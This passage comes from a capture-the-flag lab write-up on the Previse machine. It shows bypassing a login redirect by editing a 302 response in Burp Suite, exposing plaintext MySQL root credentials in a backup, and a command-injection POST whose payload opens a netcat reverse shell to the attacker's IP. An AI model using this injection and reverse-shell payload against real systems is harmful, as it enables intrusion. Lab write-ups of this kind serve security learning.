[ERROR] [!] Get &quot;http://10.10.11.104/17878&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] [!] Get &quot;http://10.10.11.104/chatterbox.txt&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] [!] Get &quot;http://10.10.11.104/merchantsolutions.php&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)

^C
</code></pre><p>Unfortunately, the majority of pages found by Gobuster redirect back to login.php page, and the exceptions are not useful in ways I have knowledge of&mldr; For example, viewing a global CSS configuration file was permitted sans-login at /css/uikit.min.css. Clearly, this issue calls for a different strategy.</p>
<h2 id=mitm-attack--burp-suite>MITM Attack — Burp Suite<a hidden class=anchor aria-hidden=true href=#mitm-attack--burp-suite>#</a></h2>
<h3 id=viewing-protected-pages>Viewing Protected Pages<a hidden class=anchor aria-hidden=true href=#viewing-protected-pages>#</a></h3>
<p>If attempting to view specific pages leads to redirection back to login.php, perhaps some information may be gleaned from examining the redirect process. Burp Suite&rsquo;s Proxy tool can be used to intercept and modify HTTP requests and responses — a man-in-the-middle (MITM) attack. Browsing to the accounts.php page is one such URL redirected to login.php, as shown by Gobuster: <code>/accounts.php (Status: 302) [Size: 3994] [--> login.php]</code>. See below: upon capturing the HTTP traffic of navigation to accounts.php in Burp Suite, we can see that the response for the request <code>GET /accounts.php HTTP/1.1</code> is <code>HTTP/1.1 302 Found</code>, and not only that, the source of accounts.php has been captured as well. <img loading=lazy src=/docs/previse2.png alt="Screenshot of accounts.php intercept in Burp Suite">
</p>
<p>Seeing the &ldquo;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!&rdquo; banner is a sure sign of progress. The captured source code, rendered above:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>HTTP/1.1 302 Found
Date: Thu, 23 Dec 2021 10:43:36 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 3994
Connection: close
Content-Type: text/html; charset=UTF-8


<span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
&lt;<span style=color:#f92672>html</span>&gt;
    &lt;<span style=color:#f92672>head</span>&gt;
        &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>http-equiv</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;content-type&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/html; charset=UTF-8&#34;</span> /&gt;
        &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span> /&gt;
        &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1.0&#34;</span> /&gt;
        &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;description&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Previse rocks your socks.&#34;</span> /&gt;
        &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;author&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;m4lwhere&#34;</span> /&gt;
        &lt;<span style=color:#f92672>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;shortcut icon&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/favicon.ico&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;image/x-icon&#34;</span> /&gt;
        &lt;<span style=color:#f92672>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;icon&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/favicon.ico&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;image/x-icon&#34;</span> /&gt;
        &lt;<span style=color:#f92672>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;apple-touch-icon&#34;</span> <span style=color:#a6e22e>sizes</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;180x180&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/apple-touch-icon.png&#34;</span>&gt;
        &lt;<span style=color:#f92672>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;icon&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;image/png&#34;</span> <span style=color:#a6e22e>sizes</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;32x32&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/favicon-32x32.png&#34;</span>&gt;
        &lt;<span style=color:#f92672>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;icon&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;image/png&#34;</span> <span style=color:#a6e22e>sizes</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;16x16&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/favicon-16x16.png&#34;</span>&gt;
        &lt;<span style=color:#f92672>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;manifest&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/site.webmanifest&#34;</span>&gt;
        &lt;<span style=color:#f92672>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;css/uikit.min.css&#34;</span> /&gt;
        &lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;js/uikit.min.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
        &lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;js/uikit-icons.min.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
   
&lt;<span style=color:#f92672>title</span>&gt;Previse Create Account&lt;/<span style=color:#f92672>title</span>&gt;
&lt;/<span style=color:#f92672>head</span>&gt;
&lt;<span style=color:#f92672>body</span>&gt;
    
&lt;<span style=color:#f92672>nav</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-navbar-container&#34;</span> <span style=color:#a6e22e>uk-navbar</span>&gt;
    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-navbar-center&#34;</span>&gt;
        &lt;<span style=color:#f92672>ul</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-navbar-nav&#34;</span>&gt;
            &lt;<span style=color:#f92672>li</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-active&#34;</span>&gt;&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/index.php&#34;</span>&gt;Home&lt;/<span style=color:#f92672>a</span>&gt;&lt;/<span style=color:#f92672>li</span>&gt;
            &lt;<span style=color:#f92672>li</span>&gt;
                &lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;accounts.php&#34;</span>&gt;ACCOUNTS&lt;/<span style=color:#f92672>a</span>&gt;
                &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-navbar-dropdown&#34;</span>&gt;
                    &lt;<span style=color:#f92672>ul</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-nav uk-navbar-dropdown-nav&#34;</span>&gt;
                        &lt;<span style=color:#f92672>li</span>&gt;&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;accounts.php&#34;</span>&gt;CREATE ACCOUNT&lt;/<span style=color:#f92672>a</span>&gt;&lt;/<span style=color:#f92672>li</span>&gt;
                    &lt;/<span style=color:#f92672>ul</span>&gt;
                &lt;/<span style=color:#f92672>div</span>&gt;
            &lt;/<span style=color:#f92672>li</span>&gt;
            &lt;<span style=color:#f92672>li</span>&gt;&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;files.php&#34;</span>&gt;FILES&lt;/<span style=color:#f92672>a</span>&gt;&lt;/<span style=color:#f92672>li</span>&gt;
            &lt;<span style=color:#f92672>li</span>&gt;
                &lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;status.php&#34;</span>&gt;MANAGEMENT MENU&lt;/<span style=color:#f92672>a</span>&gt;
                &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-navbar-dropdown&#34;</span>&gt;
                    &lt;<span style=color:#f92672>ul</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-nav uk-navbar-dropdown-nav&#34;</span>&gt;
                        &lt;<span style=color:#f92672>li</span>&gt;&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;status.php&#34;</span>&gt;WEBSITE STATUS&lt;/<span style=color:#f92672>a</span>&gt;&lt;/<span style=color:#f92672>li</span>&gt;
                        &lt;<span style=color:#f92672>li</span>&gt;&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file_logs.php&#34;</span>&gt;LOG DATA&lt;/<span style=color:#f92672>a</span>&gt;&lt;/<span style=color:#f92672>li</span>&gt;
                    &lt;/<span style=color:#f92672>ul</span>&gt;
                &lt;/<span style=color:#f92672>div</span>&gt;
            &lt;/<span style=color:#f92672>li</span>&gt;
            &lt;<span style=color:#f92672>li</span>&gt;&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;#&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;.uk-text-uppercase&#34;</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;&lt;/<span style=color:#f92672>a</span>&gt;&lt;/<span style=color:#f92672>li</span>&gt;
            &lt;<span style=color:#f92672>li</span>&gt;
                &lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;logout.php&#34;</span>&gt;
                    &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-button uk-button-default uk-button-small&#34;</span>&gt;LOG OUT&lt;/<span style=color:#f92672>button</span>&gt;
                &lt;/<span style=color:#f92672>a</span>&gt;
            &lt;/<span style=color:#f92672>li</span>&gt;
        &lt;/<span style=color:#f92672>ul</span>&gt;
    &lt;/<span style=color:#f92672>div</span>&gt;
&lt;/<span style=color:#f92672>nav</span>&gt;

&lt;<span style=color:#f92672>section</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-section uk-section-default&#34;</span>&gt;
    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-container&#34;</span>&gt;
        &lt;<span style=color:#f92672>h2</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-heading-divider&#34;</span>&gt;Add New Account&lt;/<span style=color:#f92672>h2</span>&gt;
        &lt;<span style=color:#f92672>p</span>&gt;Create new user.&lt;/<span style=color:#f92672>p</span>&gt;
        &lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-alert-danger&#34;</span>&gt;ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!&lt;/<span style=color:#f92672>p</span>&gt;
        &lt;<span style=color:#f92672>p</span>&gt;Usernames and passwords must be between 5 and 32 characters!&lt;/<span style=color:#f92672>p</span>&gt;
    &lt;/<span style=color:#f92672>p</span>&gt;
        &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>role</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;accounts.php&#34;</span>&gt;
            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-margin&#34;</span>&gt;
                &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-inline&#34;</span>&gt;
                    &lt;<span style=color:#f92672>span</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-form-icon&#34;</span> <span style=color:#a6e22e>uk-icon</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;icon: user&#34;</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
                    &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;username&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-input&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;username&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Username&#34;</span>&gt;
                &lt;/<span style=color:#f92672>div</span>&gt;
            &lt;/<span style=color:#f92672>div</span>&gt;
            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-margin&#34;</span>&gt;
                &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-inline&#34;</span>&gt;
                    &lt;<span style=color:#f92672>span</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-form-icon&#34;</span> <span style=color:#a6e22e>uk-icon</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;icon: lock&#34;</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
                    &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-input&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Password&#34;</span>&gt;
                &lt;/<span style=color:#f92672>div</span>&gt;
            &lt;/<span style=color:#f92672>div</span>&gt;
            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-margin&#34;</span>&gt;
                &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-inline&#34;</span>&gt;
                    &lt;<span style=color:#f92672>span</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-form-icon&#34;</span> <span style=color:#a6e22e>uk-icon</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;icon: lock&#34;</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;
                    &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;confirm&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-input&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;confirm&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Confirm Password&#34;</span>&gt;
                &lt;/<span style=color:#f92672>div</span>&gt;
            &lt;/<span style=color:#f92672>div</span>&gt;
            &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-button uk-button-default&#34;</span>&gt;CREATE USER&lt;/<span style=color:#f92672>button</span>&gt;
        &lt;/<span style=color:#f92672>form</span>&gt;
    &lt;/<span style=color:#f92672>div</span>&gt;
&lt;/<span style=color:#f92672>section</span>&gt;
            
&lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-position-bottom-center uk-padding-small&#34;</span>&gt;
	&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://m4lwhere.org/&#34;</span> <span style=color:#a6e22e>target</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;_blank&#34;</span>&gt;&lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uk-button uk-button-text uk-text-small&#34;</span>&gt;Created by m4lwhere&lt;/<span style=color:#f92672>button</span>&gt;&lt;/<span style=color:#f92672>a</span>&gt;
&lt;/<span style=color:#f92672>div</span>&gt;
&lt;/<span style=color:#f92672>body</span>&gt;
&lt;/<span style=color:#f92672>html</span>&gt;
</code></pre></div><p>The HTML above contains some interesting and relevant information:</p>
<ul>
<li>&ldquo;Usernames and passwords must be between 5 and 32 characters&rdquo;</li>
<li>The user addition form requires a POST request to accounts.php with the following fields:
<ul>
<li>A username</li>
<li>A password</li>
<li>A password confirmation</li>
<li>A click event on the CREATE USER button</li>
</ul>
</li>
</ul>
<h3 id=generating-a-privileged-user>Generating a Privileged User<a hidden class=anchor aria-hidden=true href=#generating-a-privileged-user>#</a></h3>
<p>Given that criteria, consider the credential set <code>username123:password123</code>. We can enter that information into the actual accounts.php page by injecting a false HTTP response code of 200 (OK) <a href=https://onappsec.com/how-to-edit-response-in-burp-proxy/>using Burp Suite Proxy</a>: <img loading=lazy src=/docs/previse3.png alt="Screenshot of accessing accounts.php via response code inject">
</p>
<p>Navigating to the login portal and submitting <code>username123:password123</code> now permits access to any previously restricted credential-pages, as can be seen below, given the example of files.php: <img loading=lazy src=/docs/previse4.png alt="Screenshot of accessing accounts.php via response code inject">
</p>
<h2 id=building-familiarity-with-previse>Building Familiarity with Previse<a hidden class=anchor aria-hidden=true href=#building-familiarity-with-previse>#</a></h2>
<h3 id=exploring-the-previse-site>Exploring the Previse Site<a hidden class=anchor aria-hidden=true href=#exploring-the-previse-site>#</a></h3>
<p>A plethora of interesting material now lies within our grasp — for instance, a full site backup may be downloaded via a link at files.php. Or, perhaps nearly as significant, a log of user activity as related to file downloads may be downloaded at file_logs.php, which looks like so:</p>
<pre tabindex=0><code class=language-none data-lang=none>$ cat previse.log
time,user,fileID
1622482496,m4lwhere,4
1622485614,m4lwhere,4
1622486215,m4lwhere,4
1622486218,m4lwhere,1
1622486221,m4lwhere,1
1622678056,m4lwhere,5
1622678059,m4lwhere,6
1622679247,m4lwhere,1
1622680894,m4lwhere,5
1622708567,m4lwhere,4
1622708573,m4lwhere,4
1622708579,m4lwhere,5
1622710159,m4lwhere,4
1622712633,m4lwhere,4
1622715674,m4lwhere,24
1622715842,m4lwhere,23
1623197471,m4lwhere,25
1623200269,m4lwhere,25
1623236411,m4lwhere,23
1623236571,m4lwhere,26
1623238675,m4lwhere,23
1623238684,m4lwhere,23
1623978778,m4lwhere,32
1640244467,username,32
1640244685,username,32
1640244690,username,1
1640244699,username,12312421
1640244721,username,4
1640244726,username,5
1640244735,username,6
1640244741,username,24
1640244751,username,23
1640244755,username,25
1640244760,username,26
1640244769,username,32
1640244776,username,33
1640244793,username,24
1640246372,recon_pilot,32
1640247712,recon_pilot,33
1640249049,recon_pilot,32
1640260386,username123,32
</code></pre><p>As a reminder, user <code>m4lwhere</code> is the user who created this CTF; I assume all other users are currently active CTF participants. At the bottom, our injected username (<code>username123</code>) can be seen. The link to download the site backup is http:/10.10.11.104/download.php?file=32. The log shows various users attempting to download many other files, so I did the same — sadly, as far as I can tell, only file <code>32</code> exists.</p>
<h3 id=examining-the-previse-backup>Examining the Previse Backup<a hidden class=anchor aria-hidden=true href=#examining-the-previse-backup>#</a></h3>
<p>Returning to the website backup, it seems that the following files are included, consistent with the pages previously found by Gobuster:</p>
<pre tabindex=0><code class=language-none data-lang=none>$ ls
total 60K
-rw-r--r-- 1 slak slak 5.6K Jun 12  2021 accounts.php
-rw-r--r-- 1 slak slak  208 Jun 12  2021 config.php
-rw-r--r-- 1 slak slak 1.6K Jun  9  2021 download.php
-rw-r--r-- 1 slak slak 1.2K Jun 12  2021 file_logs.php
-rw-r--r-- 1 slak slak 6.0K Jun  9  2021 files.php
-rw-r--r-- 1 slak slak  217 Jun  3  2021 footer.php
-rw-r--r-- 1 slak slak 1012 Jun  5  2021 header.php
-rw-r--r-- 1 slak slak  551 Jun  5  2021 index.php
-rw-r--r-- 1 slak slak 2.9K Jun 12  2021 login.php
-rw-r--r-- 1 slak slak  190 Jun  8  2021 logout.php
-rw-r--r-- 1 slak slak 1.2K Jun  9  2021 logs.php
-rw-r--r-- 1 slak slak 1.3K Jun  5  2021 nav.php
-rw-r--r-- 1 slak slak 1.9K Jun  9  2021 status.php
</code></pre><p>The file config.php contains just the information I&rsquo;d hoped for: plaintext credentials.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>connectDB</span>(){
    $host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;localhost&#39;</span>;
    $user <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;root&#39;</span>;
    $passwd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mySQL_p@ssw0rd!:)&#39;</span>;
    $db <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;previse&#39;</span>;
    $mycon <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>mysqli</span>($host, $user, $passwd, $db);
    <span style=color:#66d9ef>return</span> $mycon;
}

<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>It appears that an SQL database is connected to using credential pair <code>root:mySQL_p@ssw0rd!:)</code>. This may be our way in, should the database be vulnerable to code injection. The next step, then, requires setting aside my prejudice against PHP, as the other files must be searched for input handling issues. And Indeed, after spending an inordinate amount of time searching for issues within the PHP source of the site, logs.php contains a potentially exploitable PHP <code>exec()</code> function&mldr; Did I mention my distaste for PHP? Anyway, consider the exec function in question:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style=color:#e6db74>{</span>$_POST[<span style=color:#e6db74>&#39;delim&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>);
</code></pre></div><p>If we craft a POST request such that the delimiter (<code>delim</code>) has an executable statement appended to it, that statement should be executed. For that reason, <code>exec</code> is a dangerous PHP function, especially given the lack of input validation present here. Always sanitize input!</p>
<h2 id=gaining-shell-access>Gaining Shell Access<a hidden class=anchor aria-hidden=true href=#gaining-shell-access>#</a></h2>
<h3 id=writing-a-malicious-post-request>Writing a Malicious POST Request<a hidden class=anchor aria-hidden=true href=#writing-a-malicious-post-request>#</a></h3>
<p>As previously mentioned, if we create a normal post request to file_logs.php as follows, we then only need to append a malicious custom <code>delim</code> parameter to the end — one step at a time though.
Consider the following request, captured when submitting a request for log data from file_logs.php: <img loading=lazy src=/docs/previse5.png alt="Screenshot of obtaining a valid POST request to file_logs.php">
</p>
<p>At the bottom, <code>delim=comma</code> can be seen; this can be changed to <code>delim=comma; &lt;statement></code> to execute <code>&lt;statement></code> when the POST request is forwarded. Ideally, a reverse shell may be set up to grant shell access. This, of course, can be difficult to do without knowing what packages are installed on the target.</p>
<p>I have only ever used Netcat with Metasploit modules on old Windows XP machines to create reverse shell access, so hopefully Previse has Netcat installed. A reverse shell using Netcat can be spawned with <a href="https://explainshell.com/explain?cmd=nc+10.10.14.70+1234+-e+-c+bash"><code>nc 10.10.14.70 1234 -c bash</code></a>; so, the full post request can be as follows, given that my IP address is 10.10.14.70:</p>
<pre tabindex=0><code class=language-none data-lang=none>POST /logs.php HTTP/1.1
Host: 10.10.11.104
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.104
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.11.104/file_logs.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=b1hcqu7ulch7gleqm9f5jnapvm
Connection: close

delim=comma; nc 10.10.14.70 1234 -c bash
</code></pre><h3 id=connecting-with-netcat>Connecting with Netcat<a hidden class=anchor aria-hidden=true href=#connecting-with-netcat>#</a></h3>
<p>Before sending the POST request with the malicious connection request, we must listen for incoming connections on port 1234, as specified, which is done with <a href="https://explainshell.com/explain?cmd=nc+-nlp+1234"><code>nc -nlp 1234</code></a>. After doing so, the post request may be sent&mldr; Looks like Previse has Netcat installed after all — basic shell access has been achieved!</p>
<pre tabindex=0><code class=language-none data-lang=none>$ nc -nlp 1234
listening on [any] 1234 ...
connect to [10.10.14.70] from (UNKNOWN) [10.10.11.104] 48236
</code></pre><p>Executing <code>whoami</code> yields <code>www-data</code>, as expected.</p>
<h2 id=searching-for-user-system-flags>Searching for USER, SYSTEM Flags<a hidden class=anchor aria-hidden=true href=#searching-for-user-system-flags>#</a></h2>
<h3 id=connecting-to-the-sql-database>Connecting to the SQL Database<a hidden class=anchor aria-hidden=true href=#connecting-to-the-sql-database>#</a></h3>
<p>The primary incentive behind gaining shell access was to connect to the SQL database using the <code>root:mySQL_p@ssw0rd!:)</code> credential set found in the site backup under config.php. Let&rsquo;s see if those credentials work as expected:</p>
<pre tabindex=0><code class=language-none data-lang=none>$ mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql>Welcome <span style=color:#66d9ef>to</span> the MySQL monitor.  Commands <span style=color:#66d9ef>end</span> <span style=color:#66d9ef>with</span> ; <span style=color:#66d9ef>or</span> <span style=color:#960050;background-color:#1e0010>\</span><span style=color:#66d9ef>g</span>.
Your MySQL <span style=color:#66d9ef>connection</span> id <span style=color:#66d9ef>is</span> <span style=color:#ae81ff>1434</span>
Server <span style=color:#66d9ef>version</span>: <span style=color:#ae81ff>5</span>.<span style=color:#ae81ff>7</span>.<span style=color:#ae81ff>35</span><span style=color:#f92672>-</span><span style=color:#ae81ff>0</span>ubuntu0.<span style=color:#ae81ff>18</span>.<span style=color:#ae81ff>04</span>.<span style=color:#ae81ff>1</span> (Ubuntu)

